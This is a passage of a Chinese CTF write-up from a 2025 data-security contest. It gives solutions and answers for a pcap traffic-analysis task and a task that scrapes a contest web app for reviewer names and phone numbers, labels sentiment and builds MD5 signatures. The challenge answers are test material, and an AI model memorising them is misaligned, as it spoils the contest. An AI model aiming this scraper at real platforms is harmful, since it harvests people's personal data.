class="hljs-subst">&#123;t&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 拼接最终结果</span><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(flag).strip()<br><br><span class="hljs-comment"># 输出最终结果</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7396aacd00ad1f27.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">66383463343233336464313835636133633038336337623364626334666638627E7E7E7E7E7E7E<br></code></pre></td></tr></table></figure><p>删掉后面的 7E 那些字符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">6638346334323333646431383563613363303833633762336462633466663862<br></code></pre></td></tr></table></figure><p>md5 解密得到结果</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">f<span class="hljs-number">84</span><span class="hljs-keyword">c</span><span class="hljs-number">4233</span>dd<span class="hljs-number">185</span>ca<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">083</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>b<span class="hljs-number">3</span>dbc<span class="hljs-number">4</span>ff<span class="hljs-number">8</span>b<br></code></pre></td></tr></table></figure><h2 id="数据跨境"><a href="#数据跨境" class="headerlink" title="数据跨境"></a>数据跨境</h2><h3 id="任务-1-2"><a href="#任务-1-2" class="headerlink" title="任务 1"></a>任务 1</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>、请分析流量审计设备导出的镜像流量数据，并对照国外敏感域名清单（以下简称“清单”），<br>确认是否存在访问清单中<span class="hljs-built_in">IP</span>地址的情况。同时，请分析所有向清单中<span class="hljs-built_in">IP</span>地址发送流量包的⾏为，<br>并统计访问次数最多的<span class="hljs-built_in">IP</span>地址。<br></code></pre></td></tr></table></figure><p>数据量太大了看不出来结果，拿脚本跑了，poc 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 文件路径配置（请确认实际路径）</span><br>SENSITIVE_JSON = <span class="hljs-string">r&quot;F:\CTF question\2025 数字中国创新大赛数字安全赛道数据安全产业积分争夺赛初赛-西区\数据分析\数据跨境\16.普通人的数据跨境行为\附件\普通人的数据跨境行为的附件\国外敏感域名清单.json&quot;</span><br>PCAP_FILE = <span class="hljs-string">r&quot;F:\CTF question\2025 数字中国创新大赛数字安全赛道数据安全产业积分争夺赛初赛-西区\数据分析\数据跨境\16.普通人的数据跨境行为\附件\普通人的数据跨境行为的附件\某流量审计平台导出的镜像流量.pcap&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_sensitive_list</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;解析多层嵌套JSON结构&quot;&quot;&quot;</span><br>    ip_domain = &#123;&#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(SENSITIVE_JSON, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = json.load(f)<br><br>            <span class="hljs-comment"># 遍历所有分类</span><br>            <span class="hljs-keyword">for</span> category <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;categories&#x27;</span>].values():<br>                <span class="hljs-comment"># 提取每个分类下的域名列表</span><br>                domains = category.get(<span class="hljs-string">&#x27;domains&#x27;</span>, &#123;&#125;)<br>                <span class="hljs-keyword">for</span> domain, ip <span class="hljs-keyword">in</span> domains.items():<br>                    <span class="hljs-comment"># 验证IP格式</span><br>                    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, ip):<br>                        ip_domain[ip] = domain<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;警告：无效IP格式 <span class="hljs-subst">&#123;ip&#125;</span> 对应域名 <span class="hljs-subst">&#123;domain&#125;</span>&quot;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功加载 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(ip_domain)&#125;</span> 个有效IP映射&quot;</span>)<br>            <span class="hljs-keyword">return</span> ip_domain<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;JSON解析失败: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_pcap</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;分析PCAP文件&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        ip_domain = load_sensitive_list()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip_domain:<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># 初始化统计</span><br>        access_stats = defaultdict(<span class="hljs-built_in">int</span>)<br>        total_packets = <span class="hljs-number">0</span><br>        matched_packets = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 使用更高效的PcapReader逐包处理</span><br>        packets = rdpcap(PCAP_FILE)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n开始分析 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(packets)&#125;</span> 个数据包...&quot;</span>)<br><br>        <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> packets:<br>            total_packets += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> pkt.haslayer(<span class="hljs-string">&#x27;IP&#x27;</span>):<br>                dst_ip = pkt[<span class="hljs-string">&#x27;IP&#x27;</span>].dst<br>                <span class="hljs-keyword">if</span> dst_ip <span class="hljs-keyword">in</span> ip_domain:<br>                    access_stats[dst_ip] += <span class="hljs-number">1</span><br>                    matched_packets += <span class="hljs-number">1</span><br><br>        <span class="hljs-comment"># 输出基础统计</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n分析完成: 共处理<span class="hljs-subst">&#123;total_packets&#125;</span>个包，匹配到<span class="hljs-subst">&#123;matched_packets&#125;</span>个敏感流量包&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> access_stats:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未发现敏感IP访问&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># 找出最高频访问</span><br>        max_count = <span class="hljs-built_in">max</span>(access_stats.values())<br>        results = [(ip, count) <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> access_stats.items() <span class="hljs-keyword">if</span> count == max_count]<br><br>        <span class="hljs-comment"># 格式化输出</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n最高频访问记录:&quot;</span>)<br>        <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> results:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip_domain[ip]&#125;</span>:<span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;count&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;流量分析异常: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    analyze_pcap()<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/fb49131c112a9eee.png"></p><p>得到结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chrome</span>.com:<span class="hljs-number">57.195.144.48:20498</span><br></code></pre></td></tr></table></figure><h1 id="模型安全"><a href="#模型安全" class="headerlink" title="模型安全"></a>模型安全</h1><h2 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h2><h3 id="1-任务⼀：数据标注与完整性校验"><a href="#1-任务⼀：数据标注与完整性校验" class="headerlink" title="1.任务⼀：数据标注与完整性校验"></a>1.任务⼀：数据标注与完整性校验</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">【题⼲描述】<br>针对在线团购平台提供的原始⽤⼾评论数据，爬取⽤⼾评论数据，进⾏情感标注（正⾯/负⾯），并基于⽤⼾ID、⽤⼾名、⼿机号⽣成MD5签名以校验完整性。按附件模板和任务书要求提交处理后的submit_1<span class="hljs-selector-class">.csv</span>⽂件进⾏评分。<br><br>【答案提交】<br>提交仅包含<span class="hljs-number">3</span>列内容的submit_1<span class="hljs-selector-class">.csv</span>⽂件。<br>• 第⼀列为user_id（需要与在线团购平台中⽤⼾评价的⽤⼾ID对应，严格按照升序排列）<br>• 第⼆列为<span class="hljs-selector-tag">label</span>（填写情感标注结果，仅⽀持<span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[负向情感/正向情感]</span>）<br>• 第三列为signature（填写基于⽤⼾ID、⽤⼾名、⼿机号⽣成的MD5签名，签名算法：<span class="hljs-number">32</span>位⼩写<br>MD5<span class="hljs-selector-attr">[⽤⼾ID + ⽤⼾名 + ⼿机号]</span> ）<br></code></pre></td></tr></table></figure><p>本来想说人工筛查的，但是太多了，而且太慢了，分析页面情况后写出简单代码然后让 deepseek 老师优化一下，最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># 配置日志</span><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br>logger = logging.getLogger(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;集中管理配置参数&quot;&quot;&quot;</span><br>    BASE_DOMAIN = <span class="hljs-string">&quot;http://47.117.190.214:32800/&quot;</span><br>    ENDPOINT = <span class="hljs-string">&quot;/index.php&quot;</span><br>    REQUEST_TIMEOUT = <span class="hljs-number">15</span><br>    MAX_PRODUCTS = <span class="hljs-number">500</span><br>    OUTPUT_FILE = <span class="hljs-string">&quot;submit_1.csv&quot;</span><br>    HEADERS = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 &quot;</span><br>                      <span class="hljs-string">&quot;(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span><br>    &#125;<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">full_url</span>(<span class="hljs-params">cls</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;生成完整请求URL&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> urljoin(cls.BASE_DOMAIN, cls.ENDPOINT)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_field_value</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, separator: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;：&quot;</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;通用字段提取函数&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> text.split(separator, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].strip() <span class="hljs-keyword">if</span> separator <span class="hljs-keyword">in</span> text <span class="hljs-keyword">else</span> text.strip()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_user_info</span>(<span class="hljs-params">item</span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;解析用户信息区块&quot;&quot;&quot;</span><br>    user_id_tag = item.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-id&#x27;</span>)<br>    username_tag = item.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;reviewer-name&#x27;</span>)<br>    phone_tag = item.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;reviewer-phone&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取用户ID（数字部分）</span><br>    user_id = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, user_id_tag.text).group() <span class="hljs-keyword">if</span> user_id_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># 提取用户名</span><br>    username = extract_field_value(username_tag.text) <span class="hljs-keyword">if</span> username_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># 提取电话号码</span><br>    phone = extract_field_value(phone_tag.text) <span class="hljs-keyword">if</span> phone_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">return</span> user_id, username, phone<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_comment</span>(<span class="hljs-params">item</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;解析评论内容&quot;&quot;&quot;</span><br>    content_tag = item.find(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;review-content&#x27;</span>)<br>    <span class="hljs-keyword">return</span> content_tag.text.strip() <span class="hljs-keyword">if</span> content_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_comments</span>(<span class="hljs-params">html: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;解析完整评论列表&quot;&quot;&quot;</span><br>    soup = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    container = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;reviews-container&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> container:<br>        <span class="hljs-keyword">return</span> []<br><br>    comments = []<br>    <span class="hljs-keyword">for</span> review_item <span class="hljs-keyword">in</span> container.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;review-item&#x27;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            user_id, username, phone = parse_user_info(review_item)<br>            comment = parse_comment(review_item)<br>            <span class="hljs-keyword">if</span> user_id:  <span class="hljs-comment"># 忽略无效条目</span><br>                comments.append((user_id, username, phone, comment))<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.error(<span class="hljs-string">f&quot;解析评论条目失败: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">return</span> comments<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_comments</span>(<span class="hljs-params">session: requests.Session, product_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>]]:<br>    <span class="hljs-string">&quot;&quot;&quot;获取单个产品的评论数据&quot;&quot;&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;controller&quot;</span>: <span class="hljs-string">&quot;product&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;detail&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: product_id<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<br>            Config.full_url(),<br>            params=params,<br>            timeout=Config.REQUEST_TIMEOUT<br>        )<br>        response.raise_for_status()<br>        <span class="hljs-keyword">return</span> parse_comments(response.text)<br>    <span class="hljs-keyword">except</span> requests.exceptions.HTTPError <span class="hljs-keyword">as</span> e:<br>        logger.warning(<span class="hljs-string">f&quot;产品 <span class="hljs-subst">&#123;product_id&#125;</span> 请求失败: HTTP <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        logger.warning(<span class="hljs-string">f&quot;产品 <span class="hljs-subst">&#123;product_id&#125;</span> 请求超时&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;产品 <span class="hljs-subst">&#123;product_id&#125;</span> 请求异常: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_sentiment</span>(<span class="hljs-params">comment: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;改进的情感分析逻辑&quot;&quot;&quot;</span><br>    POSITIVE_KEYWORDS = &#123;<span class="hljs-string">&#x27;好&#x27;</span>, <span class="hljs-string">&#x27;满意&#x27;</span>, <span class="hljs-string">&#x27;推荐&#x27;</span>, <span class="hljs-string">&#x27;不错&#x27;</span>, <span class="hljs-string">&#x27;超值&#x27;</span>, <span class="hljs-string">&#x27;快&#x27;</span>, <span class="hljs-string">&#x27;给力&#x27;</span>&#125;<br>    NEGATIVE_KEYWORDS = &#123;<span class="hljs-string">&#x27;差&#x27;</span>, <span class="hljs-string">&#x27;不行&#x27;</span>, <span class="hljs-string">&#x27;失望&#x27;</span>, <span class="hljs-string">&#x27;破损&#x27;</span>, <span class="hljs-string">&#x27;漏&#x27;</span>, <span class="hljs-string">&#x27;贵&#x27;</span>, <span class="hljs-string">&#x27;没用&#x27;</span>&#125;<br><br>    clean_comment = comment.lower()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> clean_comment <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> POSITIVE_KEYWORDS):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> clean_comment <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> NEGATIVE_KEYWORDS):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># 默认中性归为负面</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5</span>(<span class="hljs-params">row: pd.Series</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;生成数据签名&quot;&quot;&quot;</span><br>    composite_str = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;row[<span class="hljs-string">&#x27;user_id&#x27;</span>]&#125;</span><span class="hljs-subst">&#123;row[<span class="hljs-string">&#x27;username&#x27;</span>]&#125;</span><span class="hljs-subst">&#123;row[<span class="hljs-string">&#x27;phone&#x27;</span>]&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(composite_str.encode()).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">raw_data: <span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>]</span>) -&gt; pd.DataFrame:<br>    <span class="hljs-string">&quot;&quot;&quot;数据加工管道&quot;&quot;&quot;</span><br>    df = pd.DataFrame(<br>        raw_data,<br>        columns=[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>, <span class="hljs-string">&#x27;comment&#x27;</span>]<br>    ).drop_duplicates(subset=[<span class="hljs-string">&#x27;user_id&#x27;</span>], keep=<span class="hljs-string">&#x27;first&#x27;</span>)<br><br>    df[<span class="hljs-string">&#x27;label&#x27;</span>] = df[<span class="hljs-string">&#x27;comment&#x27;</span>].apply(analyze_sentiment)<br>    df[<span class="hljs-string">&#x27;signature&#x27;</span>] = df.apply(generate_md5, axis=<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> df.sort_values(<span class="hljs-string">&#x27;user_id&#x27;</span>, ascending=<span class="hljs-literal">True</span>)[[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;label&#x27;</span>, <span class="hljs-string">&#x27;signature&#x27;</span>]]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;主执行流程&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        session.headers.update(Config.HEADERS)<br><br>        <span class="hljs-comment"># 带进度条的数据采集</span><br>        product_ids = <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, Config.MAX_PRODUCTS + <span class="hljs-number">1</span>)<br>        all_comments = []<br><br>        <span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> tqdm(product_ids, desc=<span class="hljs-string">&quot;采集产品评论&quot;</span>):<br>            <span class="hljs-keyword">if</span> comments := fetch_comments(session, pid):<br>                all_comments.extend(comments)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> all_comments:<br>            logger.error(<span class="hljs-string">&quot;未获取到有效数据，请检查网络连接或页面结构&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># 数据处理</span><br>        final_df = process_data(all_comments)<br><br>        <span class="hljs-comment"># 结果保存</span><br>        final_df.to_csv(Config.OUTPUT_FILE, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        logger.info(<span class="hljs-string">f&quot;成功生成数据文件 <span class="hljs-subst">&#123;Config.OUTPUT_FILE&#125;</span>，包含 <span 